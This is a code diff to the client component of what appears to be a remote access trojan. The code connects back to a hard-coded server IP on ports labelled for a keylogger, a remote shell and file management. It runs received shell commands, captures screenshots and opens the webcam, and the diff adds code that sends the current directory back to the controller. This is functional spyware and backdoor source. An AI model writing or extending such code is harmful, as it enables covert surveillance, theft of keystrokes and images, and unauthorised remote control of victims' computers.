@@ -19,7 +19,7 @@ else:
 
 
 # SERVER_HOST = sys.argv[1]
-SERVER_HOST = "192.168.89.229"
+SERVER_HOST = "192.168.43.236"
 SERVER_PORT_KEYLOGGER = 5000
 SERVER_PORT_SHELL = 5005
 SERVER_PORT_MANAGE_FILE = 5050
@@ -65,10 +65,17 @@ def client_shell():
         if splited_command[0] == 'cd':
             try:
                 os.chdir(' '.join(splited_command[1:]))
+                output = ""
+                cwd = os.getcwd()
+                message = f"{output}{SEPARATOR}{cwd}"
+                print(message)
+                s.send(message.encode())
             except Exception as e:
                 output = str(e)
-            else:
-                output = ""
+                cwd = os.getcwd()
+                message = f"{output}{SEPARATOR}{cwd}"
+                print(message)
+                s.send(message.encode())
         elif splited_command[0] == 'src':
             print('call take picture')
             screenshot = pyautogui.screenshot()
@@ -79,6 +86,9 @@ def client_shell():
             s.sendall(f"{len(img_data)}{SEPARATOR}{'image'}".encode())
             s.sendall(img_data)
             output = ""
+            cwd = os.getcwd()
+            message = f"{output}{SEPARATOR}{cwd}"
+            s.send(message.encode())
         elif splited_command[0] == 'webcam':
             cap = cv2.VideoCapture(0)
             if not cap.isOpened():
